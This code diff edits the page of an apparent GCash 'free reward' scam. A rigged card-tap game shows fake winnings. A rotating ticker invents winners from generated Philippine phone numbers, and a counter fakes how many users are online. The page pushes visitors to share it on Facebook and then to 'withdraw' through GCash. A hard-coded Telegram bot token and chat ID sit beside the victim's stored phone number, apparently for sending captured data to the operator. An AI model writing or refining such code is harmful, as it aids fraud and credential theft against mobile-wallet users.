@@ -8,6 +8,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
@@ -17,6 +19,7 @@
             --dark-bg: #04070d; 
             --glass: rgba(255, 255, 255, 0.03);
             --border: rgba(212, 175, 55, 0.3);
+            --red-glow: 0 0 20px #ff0000, 0 0 40px #ff4500;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -27,17 +30,20 @@
             min-height: 100vh; padding: 15px; overflow-x: hidden; 
         }
 
-        /* OVERLAYS */
+        /* MOBILE ONLY OVERLAY */
         #mobileOnlyOverlay { position: fixed; inset: 0; background: #04070d; z-index: 1000000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
         .spinner { width: 50px; height: 50px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
         /* UI COMPONENTS */
-        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 20px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; }
+        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 20px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; transition: transform 0.1s; }
         .logo-img { width: 130px; height: auto; margin-bottom: 15px; }
         .gc-mini-icon { width: 16px; height: 16px; vertical-align: middle; }
+        
+        /* LIVE WINNERS TRANSITION */
         .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); }
+        #winnerEntry { transition: all 0.5s ease-in-out; display: inline-block; }
 
         /* GRID & CARDS */
         .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; }
@@ -45,10 +51,14 @@
         .card-img { width: 100%; max-width: 100px; height: auto; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); transition: 0.3s; }
         .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; transform: scale(0.9); }
 
-        /* FLOATING MULTIPLIER TEXT */
+        /* ============================
+           BONGGA JACKPOT ANIMATIONS
+           ============================ */
+
+        /* Floating x2, x3, x4 */
         .floating-mult {
-            position: absolute; top: 20%; color: #fbbf24; font-family: 'Orbitron', sans-serif;
-            font-size: 26px; font-weight: 900; text-shadow: 0 0 10px #d4af37, 0 0 20px #000;
+            position: absolute; top: 10px; color: #fbbf24; font-family: 'Orbitron', sans-serif;
+            font-size: 28px; font-weight: 900; text-shadow: 0 0 10px #d4af37, 0 0 20px #000;
             pointer-events: none; animation: floatUp 1s ease-out forwards; z-index: 10;
         }
         @keyframes floatUp {
@@ -57,7 +67,31 @@
             100% { opacity: 0; transform: translateY(-60px) scale(1); }
         }
 
-        /* CARD ANIMATIONS */
+        /* Jackpot x10 Text */
+        .jackpot-text {
+            position: absolute; top: -30px; left: 50%; transform: translateX(-50%) scale(0.5);
+            color: #ff0000; font-family: 'Orbitron', sans-serif; font-size: 36px; font-weight: 900;
+            text-shadow: var(--red-glow), 0 0 60px #fff; z-index: 100;
+            animation: jackpotPop 1.8s ease-out forwards; white-space: nowrap;
+        }
+        @keyframes jackpotPop {
+            0% { transform: translateX(-50%) scale(0.5); opacity: 0; }
+            15% { transform: translateX(-50%) scale(1.8); opacity: 1; }
+            30% { transform: translateX(-50%) scale(1.2); opacity: 1; }
+            80% { transform: translateX(-50%) scale(1.1); opacity: 1; }
+            100% { transform: translateX(-50%) scale(1); opacity: 0; }
+        }
+
+        /* Screen Shake Effect */
+        .shake-screen { animation: shake 0.3s cubic-bezier(.36,.07,.19,.97) both; }
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        /* IDLE CARD ANIMATIONS */
         @keyframes goddessTwirl { 0% { transform: rotateY(0); } 100% { transform: rotateY(360deg); } }
         @keyframes monkeyBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
         @keyframes zeusShock { 0% { filter: brightness(1); } 50% { filter: brightness(2.5) drop-shadow(0 0 15px #fff); } 100% { filter: brightness(1); } }
@@ -72,9 +106,8 @@
         .move-boxer { animation: boxerPunch 0.4s ease-out 1; }
 
         /* TYPOGRAPHY & BUTTONS */
-        .amount { font-family: 'Orbitron', sans-serif; font-size: 38px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 5px 0; transition: transform 0.1s; }
+        .amount { font-family: 'Orbitron', sans-serif; font-size: 38px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; transition: transform 0.1s; }
         .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 10px 0; }
-        
         .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
         .share-btn { background: #1877f2; color: #fff; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #1052a8; }
         .pay-button { background: var(--gold); color: #000; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #8b6508; }
@@ -98,13 +131,12 @@
     <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
         
         <div style="text-align:center; margin-bottom:15px;">
-            <div style="color:#22c55e; font-size:10px; font-weight:800;"><span style="width:8px; height:8px; background:#22c55e; border-radius:50%; display:inline-block; margin-right:5px; box-shadow:0 0 8px #22c55e;"></span> <span id="userCount">74</span> ONLINE</div>
+            <div style="color:#22c55e; font-size:10px; font-weight:800;"><span style="width:8px; height:8px; background:#22c55e; border-radius:50%; display:inline-block; margin-right:5px; box-shadow:0 0 8px #22c55e;"></span> ONLINE</div>
             <div class="live-winner-box" id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</div>
         </div>
 
-        <div class="card">
+        <div class="card" id="rewardCard">
             <img src="images/logo1.png" class="logo-img">
-            
             <div class="game-grid" id="gameGrid">
                 <div class="card-wrapper" onclick="handleTap(this, 'goddess', 1)"><img src="images/img1.png" class="card-img"></div>
                 <div class="card-wrapper" onclick="handleTap(this, 'monkey', 2)"><img src="images/img2.png" class="card-img"></div>
@@ -113,17 +145,13 @@
                 <div class="card-wrapper" onclick="handleTap(this, 'dress', 5)"><img src="images/img5.png" class="card-img"></div>
                 <div class="card-wrapper" onclick="handleTap(this, 'boxer', 6)"><img src="images/img6.png" class="card-img"></div>
             </div>
-
             <div style="font-size: 10px; color: #fbbf24; font-weight: 800; letter-spacing: 2px;">AVAILABLE BALANCE</div>
             <div class="amount" id="balanceText">₱0.00</div>
-            
-            <div class="timer-box" id="timerLabel">Generating initial reward: <span id="countdown">05</span>s</div>
-
+            <div class="timer-box" id="timerLabel">Processing reward slots: <span id="countdown">05</span>s</div>
             <div class="btn-group">
                 <button class="share-btn" id="shareBtn" onclick="shareToFB()">Share to Facebook (+₱50.00)</button>
                 <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
             </div>
-
             <img src="images/casinoplus.jpeg" class="promo-photo">
         </div>
     </div>
@@ -138,100 +166,106 @@
             }
         })();
 
-        // FIREBASE INITIALIZATION
+        // FIREBASE & CONFIG
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userPhone = localStorage.getItem("userPhone") || "Unknown_User";
+        const userPhone = localStorage.getItem("userPhone") || "Guest_User";
         const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
         const chatId = "7298607329";
 
         let balance = 0;
         let clicks = 0;
-        let isReadyToPlay = false; // Prevent clicking during initial countdown
-        const baseAmount = Math.floor(Math.random() * (1500 - 500 + 1)) + 500; // Random starting amount 500-1500
+        const targetReward = [650, 850, 950][Math.floor(Math.random() * 3)];
 
-        // START INITIAL COUNTDOWN ON LOAD
-        window.onload = () => {
-            // Animate initial random balance over 5 seconds
-            animateValue(0, baseAmount, 5000);
-            
-            let timeLeft = 5;
-            const timerBox = document.getElementById('timerLabel');
-            const cdText = document.getElementById('countdown');
-            
-            const initTimer = setInterval(() => {
-                timeLeft--;
-                cdText.innerText = "0" + timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(initTimer);
-                    balance = baseAmount; // Set exact balance
-                    isReadyToPlay = true;
-                    timerBox.innerHTML = "✅ Base reward unlocked! Tap cards for bonus.";
-                    timerBox.style.color = "#22c55e";
-                }
-            }, 1000);
-        };
-
-        // CARD TAP LOGIC WITH MULTIPLIERS
+        // NO LOGS FOR TAPS
         function handleTap(el, animName, id) {
-            if (!isReadyToPlay || clicks >= 6 || el.classList.contains('card-disabled')) return;
-            
+            if (clicks >= 6 || el.classList.contains('card-disabled')) return;
             clicks++;
             const img = el.querySelector('img');
             img.classList.add('move-' + animName);
 
-            // MULTIPLIER MATH (Base: ₱25)
-            const rand = Math.random();
-            let mult = 2; // 60% chance
-            if (rand < 0.10) mult = 4; // 10% chance
-            else if (rand < 0.40) mult = 3; // 30% chance
+            // MULTIPLIER MATH BASED ON NEW PERCENTAGES
+            const rand = Math.random() * 100; // 0 to 100
+            let mult = 1; 
+            let showAnim = true;
+            let isJackpot = false;
+
+            if (rand <= 10) { mult = 10; isJackpot = true; } // JACKPOT (10% chance)
+            else if (rand <= 20) { mult = 4; } // 20%
+            else if (rand <= 40) { mult = 3; } // 40%
+            else if (rand <= 60) { mult = 2; } // 60%
+            else { mult = 1; showAnim = false; } // 80% and others (x1 = no animation)
 
             const addedAmount = 25 * mult;
             const nextBal = balance + addedAmount;
             
-            // Show Floating Multiplier
-            const floater = document.createElement('div');
-            floater.className = 'floating-mult';
-            floater.innerText = `x${mult}`;
-            el.appendChild(floater);
-            
-            // Pop the balance text
-            const balText = document.getElementById('balanceText');
-            balText.style.transform = "scale(1.1)";
-            setTimeout(() => { balText.style.transform = "scale(1)"; }, 150);
+            // JACKPOT EFFECTS (BONGGA MODE)
+            if (isJackpot) {
+                // 1. Confetti Burst
+                fireJackpotConfetti();
+                
+                // 2. Big Red Text
+                const jack = document.createElement('div');
+                jack.className = 'jackpot-text';
+                jack.innerText = "JACKPOT x10!";
+                el.appendChild(jack);
+                setTimeout(() => jack.remove(), 1800);
+                
+                // 3. Screen Shake
+                const card = document.getElementById('rewardCard');
+                card.classList.add('shake-screen');
+                setTimeout(() => card.classList.remove('shake-screen'), 300);
+            } 
+            // Normal Multiplier Effect
+            else if (showAnim) {
+                const floater = document.createElement('div');
+                floater.className = 'floating-mult';
+                floater.innerText = `x${mult}`;
+                el.appendChild(floater);
+                setTimeout(() => floater.remove(), 1000);
+            }
 
             animateValue(balance, nextBal, 400);
             balance = nextBal;
+            setTimeout(() => { el.classList.add('card-disabled'); }, 500);
+            if (clicks === 6) { startCountdown(); }
+        }
 
-            setTimeout(() => { 
-                el.classList.add('card-disabled'); 
-                floater.remove();
-            }, 800);
+        function fireJackpotConfetti() {
+            // Center burst
+            confetti({
+                particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff', '#ff4500']
+            });
+            // Left & Right cannon
+            setTimeout(() => {
+                confetti({ particleCount: 50, angle: 60, spread: 55, origin: { x: 0 }, colors: ['#ff0000', '#ffd700'] });
+                confetti({ particleCount: 50, angle: 120, spread: 55, origin: { x: 1 }, colors: ['#ff0000', '#ffd700'] });
+            }, 200);
+        }
 
-            // SHOW SHARE BUTTON AT 6 CLICKS
-            if (clicks === 6) {
-                setTimeout(() => {
-                    document.getElementById('timerLabel').innerHTML = "🎁 All bonuses collected! Share to claim.";
-                    document.getElementById('timerLabel').style.color = "#fbbf24";
+        function startCountdown() {
+            const timerBox = document.getElementById('timerLabel');
+            timerBox.style.display = 'block';
+            let timeLeft = 5;
+            const countdown = setInterval(() => {
+                timeLeft--;
+                document.getElementById('countdown').innerText = "0" + timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    timerBox.innerHTML = "✅ Reward Slots Verified!";
                     document.getElementById('shareBtn').style.display = 'block';
-                }, 800);
-            }
+                }
+            }, 1000);
         }
 
         function shareToFB() {
             window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
-            
-            // Reward +50 and transition to Withdraw Button
             setTimeout(() => {
-                animateValue(balance, balance + 50, 500);
                 balance += 50;
-                
+                document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
                 document.getElementById('shareBtn').style.display = 'none';
-                document.getElementById('timerLabel').style.display = 'none';
-                
-                const claimBtn = document.getElementById('claimBtn');
-                claimBtn.style.display = 'block';
-                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
+                document.getElementById('claimBtn').style.display = 'block';
+                document.getElementById('claimBtn').innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
             }, 1000);
         }
 
@@ -267,21 +301,23 @@
             });
         }
 
-        // FIXED LIVE WINNER ROTATOR
+        // LIVE WINNER ROTATOR WITH SMOOTH ANIMATION
         setInterval(() => {
-            const online = Math.floor(Math.random() * 30) + 60;
-            document.getElementById('userCount').innerText = online;
-            
-            const prefixes = ["0917", "0915", "0998", "0966", "0927", "0939"];
-            const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
-            const suffix = Math.floor(1000 + Math.random() * 9000);
-            
-            const amounts = [500, 800, 1000, 1200, 1500, 2000];
-            const amt = amounts[Math.floor(Math.random() * amounts.length)];
-            
-            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱${amt.toLocaleString()}`;
-        }, 3500);
+            const winnerBox = document.getElementById('winnerEntry');
+            winnerBox.style.opacity = '0';
+            winnerBox.style.transform = 'translateY(-15px)';
 
+            setTimeout(() => {
+                const online = Math.floor(Math.random() * 30) + 60;
+                document.getElementById('userCount').innerText = online;
+                const pref = ["0917", "0915", "0998", "0966", "0927", "0939"][Math.floor(Math.random() * 6)];
+                const suffix = Math.floor(1000 + Math.random() * 9000);
+                const amt = [500, 800, 1000, 1200, 1500][Math.floor(Math.random() * 5)];
+                winnerBox.innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱${amt.toLocaleString()}`;
+                winnerBox.style.opacity = '1';
+                winnerBox.style.transform = 'translateY(0)';
+            }, 500);
+        }, 4000);
     </script>
 </body>
 </html>
